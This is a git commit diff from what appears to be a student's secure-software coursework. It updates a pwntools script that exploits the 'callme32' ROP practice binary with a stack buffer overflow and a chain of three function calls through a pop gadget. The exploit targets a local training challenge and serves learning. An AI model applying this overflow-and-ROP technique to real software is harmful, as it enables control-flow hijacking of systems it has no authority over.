6e3df7e26da4811cff54dfc0869843937ebc42af
Malachi Parks <Malachiparks1999@gmail.com>
2022-03-13 22:08:24 -0400

    PCP11 finished, need to do PCP12 with writeup

--- PCPs/Pacecar11_and_12/callme32_answer.py
+++ PCPs/Pacecar11_and_12/callme32_answer.py
@@ -9,9 +9,9 @@ File Description:  Need to call
 from pwn import *
 
 # Variables to use for payload
-payload='' # used for sending payload later
+payload=b'' # used for sending payload later
 pop_3_times=p32(0x080487f9) # Calls pop 3x into esi,edi and ebp
-offset='a'*44  # 28h + 4 bytes to overwrite ebp
+offset=b'a'*44  # 28h + 4 bytes to overwrite ebp
 
 # Calling functions within ROP
 arg1=p32(0xdeadbeef)  # First parameter in call functions
@@ -22,10 +22,11 @@ callTwo=p32(0x08048550)       # callme_two func
 callThree=p32(0x080484e0)       # callme_three func
 
 # Start process to launch program
-p=process("./callme32")
+p=process('/home/kali/Desktop/CPEG676-SecureSoftware/PCPs/Pacecar11_and_12/callme32')
 payload+=offset # Add offset to payload
 payload+=callOne+pop_3_times+arg1+arg2+arg3   # Add call for callme_one
 payload+=callTwo+pop_3_times+arg1+arg2+arg3   # Add call for callme_two
 payload+=callThree+pop_3_times+arg1+arg2+arg3   # Add call for callme_three
+
 p.sendline(payload)    # Send payload
-flag=p.recv()          # Recieve message after sending
+p.interactive()          # Recieve message after sending
